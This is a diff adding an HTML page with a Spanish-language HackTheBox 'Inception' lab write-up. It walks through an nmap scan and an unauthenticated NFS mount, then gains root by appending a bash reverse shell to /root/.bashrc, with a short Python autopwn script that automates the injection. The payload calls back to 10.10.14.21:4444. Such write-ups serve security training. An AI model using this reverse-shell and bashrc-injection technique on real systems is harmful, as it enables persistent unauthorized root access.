@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB - Inception | r4venn_</title>
+  <link rel="stylesheet" href="/css/styles.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>
+</head>
+<body>
+  <div id="particles-js"></div>
+
+  <div class="terminal">
+    <h1 class="glitch" data-text=">_ HTB - Inception">>_ HTB - Inception</h1>
+    <a class="btn" href="/">/back</a>
+  </div>
+
+  <div id="markdown-container">
+    <h2>➤ Ficha técnica</h2>
+    <ul>
+      <li><strong>Dificultad:</strong> Media</li>
+      <li><strong>Sistema:</strong> Linux</li>
+      <li><strong>IP:</strong> 10.10.10.67</li>
+      <li><strong>Tags:</strong> NFS, BashRC, Privesc</li>
+    </ul>
+
+    <h2>➤ Enumeración</h2>
+    <p>Iniciamos con un escaneo agresivo para descubrir servicios:</p>
+    <pre><code>nmap -sC -sV -T4 10.10.10.67</code></pre>
+
+    <h2>➤ Montaje NFS</h2>
+    <p>Descubrimos que podemos montar un sistema remoto sin autenticación:</p>
+    <pre><code>sudo mount -t nfs 10.10.10.67:/ /mnt/nfs</code></pre>
+
+    <h2>➤ Escalada de privilegios</h2>
+    <p>Accedemos al <code>.bashrc</code> de root, inyectamos shell reversa y reiniciamos sesión:</p>
+    <pre><code>echo "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" >> /root/.bashrc</code></pre>
+
+    <h2>➤ Root access</h2>
+    <p>Recibimos conexión como root:</p>
+    <pre><code>whoami
+root</code></pre>
+
+    <h2>➤ Flag</h2>
+    <pre><code>cat /root/root.txt
+e3f29e...c02</code></pre>
+
+    <h2>➤ Autopwn Script</h2>
+    <p>Para automatizar el proceso:</p>
+    <pre><code class="language-python">#!/usr/bin/env python3
+import os
+print("[*] Mounting NFS...")
+os.system("sudo mount -t nfs 10.10.10.67:/ /mnt/nfs")
+print("[*] Injecting reverse shell into bashrc...")
+payload = 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'
+with open("/mnt/nfs/root/.bashrc", "a") as f:
+    f.write(payload)
+print("[+] Payload injected. Wait for root to reconnect.")
+</code></pre>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
+  <script>
+    particlesJS("particles-js", {
+      particles: {
+        number: { value: 90 },
+        color: { value: "#39FF14" },
+        shape: { type: "circle" },
+        opacity: { value: 0.2 },
+        size: { value: 2 },
+        line_linked: {
+          enable: true,
+          distance: 150,
+          color: "#39FF14",
+          opacity: 0.2,
+          width: 1
+        },
+        move: { enable: true, speed: 1.2 }
+      },
+      interactivity: {
+        events: {
+          onhover: { enable: true, mode: "repulse" }
+        }
+      }
+    });
+  </script>
+</body>
+</html>
+
